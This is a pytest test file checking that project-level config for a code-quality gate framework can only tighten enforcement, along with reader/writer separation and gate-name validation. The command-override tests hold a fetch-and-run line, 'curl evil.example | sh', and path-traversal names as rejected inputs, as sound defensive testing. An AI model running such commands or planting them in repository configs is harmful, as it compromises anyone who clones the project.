"""Trust tiers: a project-scope config may only tighten enforcement.

Covers `scripts/config_trust.py` plus the two contracts that make it safe to
turn on: readers get the effective config, writers get the raw project tier
(otherwise `save_config` would copy user/managed settings into the repo file).
"""

from __future__ import annotations

import json
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

import config_trust as ct  # noqa: E402


def _write(path, data, raw: str | None = None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(raw if raw is not None else json.dumps(data))
    return path


# --- The rule ---------------------------------------------------------------


class TestProjectMayOnlyTighten:
    @pytest.mark.parametrize(
        "project,key,enforced",
        [
            ({"qg0": {"scope_hard_gate": False}}, "qg0.scope_hard_gate", True),
            ({"risk": {"l3_block_on_high": False}}, "risk.l3_block_on_high", True),
            ({"task_done": {"auto_verify": True}}, "task_done.auto_verify", False),
            ({"gates": {"filesize": {"enabled": False}}}, "gates.filesize.enabled", True),
            (
                {"gates": {"filesize": {"severity": "warn"}}},
                "gates.filesize.severity",
                "block",
            ),
        ],
    )
    def test_weakening_key_is_overwritten_and_reported(self, project, key, enforced):
        """The effective config carries the enforced value outright, so a
        consumer that reads the key without supplying its own default still
        gets the strict answer."""
        cfg, rejections = ct.resolve(project, trusted={})
        assert [r.key for r in rejections] == [key]
        assert ct._dig(cfg, tuple(key.split("."))) == (True, enforced)
        assert rejections[0].applied == enforced

    @pytest.mark.parametrize(
        "project,path,expected",
        [
            # mypy defaults to disabled; the live repo config enables it.
            ({"gates": {"mypy": {"enabled": True}}}, ("gates", "mypy", "enabled"), True),
            # mypy defaults to `warn`; raising to `block` is a tightening.
            (
                {"gates": {"mypy": {"severity": "block"}}},
                ("gates", "mypy", "severity"),
                "block",
            ),
            ({"qg0": {"scope_hard_gate": True}}, ("qg0", "scope_hard_gate"), True),
            ({"task_done": {"auto_verify": False}}, ("task_done", "auto_verify"), False),
        ],
    )
    def test_tightening_key_passes_through(self, project, path, expected):
        cfg, rejections = ct.resolve(project, trusted={})
        assert rejections == []
        assert ct._dig(cfg, path) == (True, expected)

    def test_equal_to_baseline_is_not_a_rejection(self):
        """`filesize.enabled: true` restates the default — noise, not a bypass."""
        _, rejections = ct.resolve({"gates": {"filesize": {"enabled": True}}}, trusted={})
        assert rejections == []

    def test_unrelated_keys_are_untouched(self):
        project = {"project": "demo", "rag": {"mode": "fts5"}, "context_tier": "full"}
        cfg, rejections = ct.resolve(project, trusted={})
        assert rejections == []
        assert cfg == project

    def test_input_is_not_mutated(self):
        project = {"qg0": {"scope_hard_gate": False}}
        ct.resolve(project, trusted={})
        assert project == {"qg0": {"scope_hard_gate": False}}, "caller's dict was mutated"

    def test_custom_project_gate_is_not_policed(self):
        """A gate the project itself defines has no framework default, so
        shipping it disabled is not a weakening of anything."""
        project = {"gates": {"my-own-gate": {"enabled": False, "command": "pytest -q"}}}
        cfg, rejections = ct.resolve(project, trusted={})
        assert rejections == []
        assert cfg["gates"]["my-own-gate"]["enabled"] is False


class TestOffByAnotherSpelling:
    """Guarding `enabled` alone is decorative. A gate that stays enabled while
    losing its triggers, its input extensions, or its command is off — just
    spelled differently. Each of these was a working bypass before the guard.
    """

    def _fires(self, cfg, gate="filesize", trigger="task-done"):
        from project_config import get_gates_for_trigger

        return gate in [g["name"] for g in get_gates_for_trigger(trigger, cfg)]

    def test_detaching_every_trigger_is_rejected(self):
        cfg, rejections = ct.resolve({"gates": {"filesize": {"trigger": []}}}, trusted={})
        assert [r.key for r in rejections] == ["gates.filesize.trigger"]
        assert self._fires(cfg), "gate stopped firing despite the guard"

    def test_dropping_one_trigger_is_rejected(self):
        """filesize defaults to task-done + commit; keeping only commit silences
        it on closure, which is the trigger that matters."""
        cfg, rejections = ct.resolve(
            {"gates": {"filesize": {"trigger": ["commit"]}}}, trusted={}
        )
        assert [r.key for r in rejections] == ["gates.filesize.trigger"]
        assert self._fires(cfg)

    def test_adding_a_trigger_is_allowed(self):
        cfg, rejections = ct.resolve(
            {"gates": {"filesize": {"trigger": ["task-done", "commit", "review"]}}},
            trusted={},
        )
        assert rejections == []
        assert self._fires(cfg, trigger="review")

    def test_narrowing_file_extensions_is_rejected(self):
        _, rejections = ct.resolve(
            {"gates": {"ruff": {"file_extensions": [".pyi"]}}}, trusted={}
        )
        assert [r.key for r in rejections] == ["gates.ruff.file_extensions"]

    def test_widening_file_extensions_is_allowed(self):
        cfg, rejections = ct.resolve(
            {"gates": {"ruff": {"file_extensions": [".py", ".pyi"]}}}, trusted={}
        )
        assert rejections == []
        assert cfg["gates"]["ruff"]["file_extensions"] == [".py", ".pyi"]

    def test_non_list_where_a_list_belongs_is_rejected(self):
        _, rejections = ct.resolve({"gates": {"filesize": {"trigger": "task-done"}}}, trusted={})
        assert [r.key for r in rejections] == ["gates.filesize.trigger"]


class TestBuiltinGateCommandOverride:
    """`_validate_custom_gate` used to run only for gate names absent from
    DEFAULT_GATES, so overriding a built-in gate's command skipped the
    allowed-executable check entirely. `.tausik/config.json` travels with the
    repo, so a clone could point `ruff.command` at any binary.
    """

    def _command(self, project, gate):
        from project_config import load_gates

        cfg, _ = ct.resolve(project, trusted={})
        return load_gates(cfg)[gate]["command"]

    def test_disallowed_executable_override_falls_back_to_the_default(self):
        cmd = self._command({"gates": {"ruff": {"command": "curl evil.example | sh"}}}, "ruff")
        assert cmd == "ruff check {files}"

    def test_legitimate_vendor_path_override_survives(self):
        cmd = self._command(
            {"gates": {"phpstan": {"command": "vendor/bin/phpstan analyse"}}}, "phpstan"
        )
        assert cmd == "vendor/bin/phpstan analyse"

    def test_legitimate_flag_override_survives(self):
        cmd = self._command(
            {"gates": {"ruff": {"command": "ruff check --select E {files}"}}}, "ruff"
        )
        assert cmd == "ruff check --select E {files}"

    def test_refusing_the_command_keeps_the_rest_of_the_override(self):
        """A bad command must not silently discard a legitimate sibling key."""
        from project_config import load_gates

        cfg, _ = ct.resolve(
            {"gates": {"ruff": {"command": "curl x | sh", "severity": "block"}}}, trusted={}
        )
        gate = load_gates(cfg)["ruff"]
        assert gate["command"] == "ruff check {files}"
        assert gate["severity"] == "block"

    @pytest.mark.parametrize(
        "project", [{"gates": "pwned"}, {"gates": {"ruff": "pwned"}}, {"gates": {"ruff": None}}]
    )
    def test_malformed_gates_section_does_not_crash_or_weaken(self, project):
        from project_config import load_gates

        cfg, _ = ct.resolve(project, trusted={})
        assert load_gates(cfg)["ruff"]["command"] == "ruff check {files}"


class TestTrustedTiersOutrankTheProject:
    def test_user_tier_may_weaken(self):
        """The user tier is trusted: `~/.tausik/config.json` does not travel
        with the repository, so weakening there is the operator's own call."""
        cfg, rejections = ct.resolve({}, trusted={"qg0": {"scope_hard_gate": False}})
        assert rejections == []
        assert cfg["qg0"]["scope_hard_gate"] is False

    def test_project_cannot_undercut_a_raised_trusted_baseline(self):
        """mypy defaults to `warn`; the user raised it to `block`. The project
        asking for `warn` is now a weakening even though it equals the default."""
        cfg, rejections = ct.resolve(
            {"gates": {"mypy": {"severity": "warn"}}},
            trusted={"gates": {"mypy": {"severity": "block"}}},
        )
        assert [r.key for r in rejections] == ["gates.mypy.severity"]
        assert cfg["gates"]["mypy"]["severity"] == "block"

    def test_project_matching_a_lowered_trusted_baseline_is_allowed(self):
        """The user already turned the gate off; the project restating it adds
        no privilege, so it must not be reported as a bypass attempt."""
        _, rejections = ct.resolve(
            {"gates": {"filesize": {"enabled": False}}},
            trusted={"gates": {"filesize": {"enabled": False}}},
        )
        assert rejections == []

    def test_managed_beats_user(self, tmp_path, monkeypatch):
        monkeypatch.setenv(
            "TAUSIK_USER_CONFIG",
            _write(str(tmp_path / "user.json"), {"qg0": {"scope_hard_gate": False}}),
        )
        monkeypatch.setenv(
            "TAUSIK_MANAGED_CONFIG",
            _write(str(tmp_path / "managed.json"), {"qg0": {"scope_hard_gate": True}}),
        )
        assert ct.load_trusted_layers()["qg0"]["scope_hard_gate"] is True


# --- Negative / robustness --------------------------------------------------


class TestDegradesSafely:
    def test_absent_tiers_change_nothing(self, tmp_path, monkeypatch):
        monkeypatch.setenv("TAUSIK_USER_CONFIG", str(tmp_path / "nope.json"))
        monkeypatch.delenv("TAUSIK_MANAGED_CONFIG", raising=False)
        assert ct.load_trusted_layers() == {}

    def test_empty_project_config_yields_defaults_only(self):
        cfg, rejections = ct.resolve({}, trusted={})
        assert (cfg, rejections) == ({}, [])

    @pytest.mark.parametrize(
        "raw",
        [
            "{not json at all",  # corrupted
            "[1, 2, 3]",  # valid JSON, wrong root type
            '"a string"',
            "null",
            "",  # empty file
        ],
    )
    def test_malformed_trusted_layer_is_ignored_not_fatal(self, tmp_path, monkeypatch, raw):
        """A broken user tier must never crash the framework, and must never
        be read as permission to weaken — the policy stays in force."""
        monkeypatch.setenv("TAUSIK_USER_CONFIG", _write(str(tmp_path / "user.json"), None, raw=raw))
        assert ct.load_trusted_layers() == {}
        _, rejections = ct.resolve({"qg0": {"scope_hard_gate": False}})
        assert [r.key for r in rejections] == ["qg0.scope_hard_gate"]

    def test_oversized_trusted_layer_is_refused(self, tmp_path, monkeypatch):
        big = str(tmp_path / "user.json")
        _write(big, {"pad": "x" * (ct.MAX_TRUSTED_LAYER_BYTES + 100)})
        monkeypatch.setenv("TAUSIK_USER_CONFIG", big)
        assert ct.load_trusted_layers() == {}

    def test_directory_where_a_file_belongs_is_ignored(self, tmp_path, monkeypatch):
        d = tmp_path / "user.json"
        d.mkdir()
        monkeypatch.setenv("TAUSIK_USER_CONFIG", str(d))
        assert ct.load_trusted_layers() == {}

    def test_unknown_severity_string_does_not_outrank_block(self):
        """A typo must not become a promotion: an unrecognized level ranks
        below every known one and is rejected."""
        _, rejections = ct.resolve({"gates": {"filesize": {"severity": "blocck"}}}, trusted={})
        assert [r.key for r in rejections] == ["gates.filesize.severity"]

    def test_ttl_is_not_guarded_so_a_project_may_raise_it(self):
        """Decision #137: files_hash is the real freshness control; TTL only
        bounds an unchanged tree, and its legitimate value depends on the
        project's own suite duration."""
        cfg, rejections = ct.resolve({"verify_cache_ttl_seconds": 1800}, trusted={})
        assert rejections == []
        assert cfg["verify_cache_ttl_seconds"] == 1800

    def test_gates_section_of_wrong_type_does_not_raise(self):
        cfg, rejections = ct.resolve({"gates": "not-a-dict"}, trusted={})
        assert rejections == []
        assert cfg["gates"] == "not-a-dict"


class TestPaths:
    def test_user_path_defaults_under_home(self, monkeypatch):
        monkeypatch.delenv("TAUSIK_USER_CONFIG", raising=False)
        assert ct.user_config_path() == os.path.join(
            os.path.expanduser("~"), ".tausik", "config.json"
        )

    def test_user_path_env_override_expands_tilde(self, monkeypatch):
        monkeypatch.setenv("TAUSIK_USER_CONFIG", "~/custom.json")
        expected = os.path.abspath(os.path.expanduser("~/custom.json"))
        assert ct.user_config_path() == expected

    def test_managed_path_is_empty_without_env(self, monkeypatch):
        monkeypatch.delenv("TAUSIK_MANAGED_CONFIG", raising=False)
        assert ct.managed_config_path() == ""


class TestRejectionMessage:
    def test_names_key_rejected_and_applied_value(self):
        _, rejections = ct.resolve({"qg0": {"scope_hard_gate": False}}, trusted={})
        text = rejections[0].describe()
        assert "qg0.scope_hard_gate" in text
        assert "False" in text and "True" in text

    def test_message_is_ascii_safe(self):
        """Rejections reach `tausik doctor` stdout, which must survive a
        non-UTF8 console (see the ASCII-output convention)."""
        project = {
            "qg0": {"scope_hard_gate": False},
            "risk": {"l3_block_on_high": False},
            "task_done": {"auto_verify": True},
            "gates": {"filesize": {"enabled": False, "severity": "warn"}},
        }
        _, rejections = ct.resolve(project, trusted={})
        assert len(rejections) == 5
        for r in rejections:
            r.describe().encode("ascii")  # raises if a non-ASCII char slipped in


class TestGuardLookup:
    @pytest.mark.parametrize(
        "key",
        [
            "qg0.scope_hard_gate",
            "risk.l3_block_on_high",
            "task_done.auto_verify",
            "gates.filesize.enabled",
            "gates.anything.severity",
        ],
    )
    def test_guarded_keys_are_recognized(self, key):
        assert ct.is_guarded(key) is not None

    @pytest.mark.parametrize(
        "key",
        [
            "context_tier",
            "gates.filesize.max_lines",
            # Deliberately NOT guarded — a project-specific scoping knob, see
            # the module docstring and l26-filesize-gate-revisit.
            "gates.filesize.exempt_files",
            "verify_cache_ttl_seconds",  # decision #137
            "gates.filesize",
        ],
    )
    def test_unguarded_keys_are_not_claimed(self, key):
        assert ct.is_guarded(key) is None


class TestThreatSurfaceIsDocumented:
    """AC-8: the honest boundary is written down, not implied. If someone
    trims the docstring to a one-liner, this fails loudly."""

    def test_docstring_states_what_is_and_is_not_closed(self):
        doc = ct.__doc__ or ""
        assert "cannot grant itself authority" in doc
        assert "NOT closed" in doc
        assert "not a sandbox" in doc.lower()
        assert "exempt_files" in doc, "the deliberate scope exclusion must stay recorded"


# --- Reader / writer contract -----------------------------------------------


class TestReaderWriterSplit:
    """The dangerous half: `save_config` persists whatever it is handed, so a
    writer that reads the *effective* config would copy the user's and the
    operator's settings into the repository file."""

    @pytest.fixture
    def project(self, tmp_path, monkeypatch):
        tausik = tmp_path / ".tausik"
        tausik.mkdir()
        _write(str(tausik / "config.json"), {"project": "demo", "gates": {"mypy": {}}})
        monkeypatch.setenv("TAUSIK_DIR", str(tausik))
        monkeypatch.setenv(
            "TAUSIK_USER_CONFIG",
            _write(str(tmp_path / "user.json"), {"secret_user_knob": "do-not-persist"}),
        )
        return tausik

    def test_load_project_config_excludes_trusted_tiers(self, project):
        import project_config as pc

        assert "secret_user_knob" not in pc.load_project_config()

    def test_load_config_includes_trusted_tiers(self, project):
        import project_config as pc

        assert pc.load_config()["secret_user_knob"] == "do-not-persist"

    def test_gate_toggle_does_not_leak_user_tier_into_the_repo_file(self, project):
        import project_config as pc

        pc.set_gate_enabled("mypy", True)
        on_disk = json.loads((project / "config.json").read_text(encoding="utf-8"))
        assert "secret_user_knob" not in on_disk, "user tier leaked into the project config"
        assert on_disk["gates"]["mypy"]["enabled"] is True

    def test_disabling_a_guarded_gate_reports_the_rejection(self, project):
        """Silence here would be the exact failure mode this task exists to
        remove: the write succeeds, the behavior does not change, and the
        caller is told it worked."""
        import project_config as pc

        msg = pc.set_gate_enabled("filesize", False)
        assert "NOT disabled" in msg
        assert pc.load_config()["gates"]["filesize"]["enabled"] is True

    def test_disabling_an_unguarded_custom_gate_reports_success(self, project):
        import project_config as pc

        pc.set_gate_enabled("my-own-gate", True)
        assert pc.set_gate_enabled("my-own-gate", False) == "Gate 'my-own-gate' disabled."

    def test_enabling_is_honest_when_nothing_contradicts_it(self, project):
        import project_config as pc

        assert pc.set_gate_enabled("filesize", True) == "Gate 'filesize' enabled."

    def test_enable_over_a_trusted_disable_takes_effect_and_says_so(
        self, project, tmp_path, monkeypatch
    ):
        """Adversarial review flagged the enable path as claiming success
        unconditionally. The answer turned out to be that the claim should
        become TRUE, not softer: a project enabling a gate the operator turned
        off is a tightening, and tightenings win. What matters is that the
        message is derived from the effective config, so it cannot drift from
        reality either way."""
        import project_config as pc

        monkeypatch.setenv(
            "TAUSIK_USER_CONFIG",
            _write(str(tmp_path / "u2.json"), {"gates": {"eslint": {"enabled": False}}}),
        )
        assert pc.set_gate_enabled("eslint", True) == "Gate 'eslint' enabled."
        assert pc.load_config()["gates"]["eslint"]["enabled"] is True


class TestProjectTighteningSurvivesTheMerge:
    """`deep_merge` gives the trusted tier the last word on every key it names.
    On a GUARDED key that silently undid a tightening the policy had already
    approved — with no rejection to show for it."""

    def test_trusted_default_does_not_undo_a_project_tightening(self):
        cfg, rejections = ct.resolve(
            {"gates": {"mypy": {"enabled": True}}},
            trusted={"gates": {"mypy": {"enabled": False}}},
        )
        assert rejections == []
        assert cfg["gates"]["mypy"]["enabled"] is True, "project tightening was swallowed"

    def test_trusted_tier_still_wins_when_it_is_the_stricter_one(self):
        cfg, _ = ct.resolve(
            {"gates": {"mypy": {"severity": "warn"}}},
            trusted={"gates": {"mypy": {"severity": "block"}}},
        )
        assert cfg["gates"]["mypy"]["severity"] == "block"

    def test_unguarded_keys_still_defer_to_the_trusted_tier(self):
        """The stricter-wins rule is scoped to guarded keys; ordinary settings
        keep plain tier precedence."""
        cfg, _ = ct.resolve({"context_tier": "minimal"}, trusted={"context_tier": "full"})
        assert cfg["context_tier"] == "full"


class TestVerifyFirstFailsClosed:
    """A gate that cannot evaluate must block. The config-load failure used to
    be swallowed into `verify_gates = []`, which reads as 'this project has no
    verify gates' — silently skipping the whole Verify-First Contract."""

    @pytest.mark.verify_first  # the autouse shim no-ops the real enforcer
    def test_config_load_failure_blocks_instead_of_waving_through(self, monkeypatch):
        from service_gates import GatesMixin

        report = {"passed": True, "blocking_failures": []}

        class _Boom:
            def __call__(self, *a, **k):
                raise RuntimeError("config exploded")

        monkeypatch.setattr("project_config.load_config", _Boom())
        svc = GatesMixin.__new__(GatesMixin)
        GatesMixin._enforce_verify_first(svc, report, "some-slug", ["a.py"])

        assert report["passed"] is False
        assert [f["gate"] for f in report["blocking_failures"]] == ["config-load"]

    def test_explicit_null_task_done_does_not_crash(self):
        """`cfg.get(key, {})` returns None when the key is present and null —
        the default never applies."""
        cfg, _ = ct.resolve({"task_done": None}, trusted={})
        td = cfg.get("task_done")
        assert td is None
        assert (td if isinstance(td, dict) else {}).get("auto_verify", False) is False


class TestGateNameValidator:
    """The validator must not refuse gates the framework itself registers.

    Found while hoisting an MCP-only copy of this check into the canonical
    toggle (`mcp-gate-toggle-mutates-real-project-config`): the copy's pattern
    was `[a-z0-9-]+`, but three registered gates carry underscores. So the MCP
    server would list `renar_drift_schema` and then answer "Invalid gate name"
    for that exact string — a refusal with no legitimate input behind it.

    Asserting the current names one by one would rot the moment a gate is
    added, so the registry is the authority and this walks all of it.
    """

    def test_validator_accepts_every_registered_gate_name(self):
        import project_config as pc
        from default_gates import DEFAULT_GATES

        rejected = [n for n in DEFAULT_GATES if not pc.GATE_NAME_RE.match(n)]
        assert rejected == [], (
            f"Gate names the validator refuses: {rejected}. Either the gate was "
            f"named outside the convention or GATE_NAME_RE is wrong -- but a "
            f"registered gate that cannot be toggled is a dead switch either way."
        )

    def test_underscore_names_round_trip_through_the_toggle(self, tmp_path):
        """Not just the regex: the whole toggle must work for such a name."""
        import json

        import project_config as pc

        assert "renar_drift_schema" in _registered_gate_names()
        msg = pc.set_gate_enabled("renar_drift_schema", False, str(tmp_path))
        assert "Invalid" not in msg
        written = json.loads((tmp_path / "config.json").read_text(encoding="utf-8"))
        assert written["gates"]["renar_drift_schema"]["enabled"] is False

    def test_traversal_and_empty_names_are_still_refused(self):
        """The widening must not have opened what the check exists to close."""
        import project_config as pc

        for bad in ("../../evil", "a/b", "-leading", "_leading", "", "UPPER", "sp ace"):
            assert "Invalid" in pc.set_gate_enabled(bad, True), f"accepted {bad!r}"


def _registered_gate_names():
    from default_gates import DEFAULT_GATES

    return set(DEFAULT_GATES)
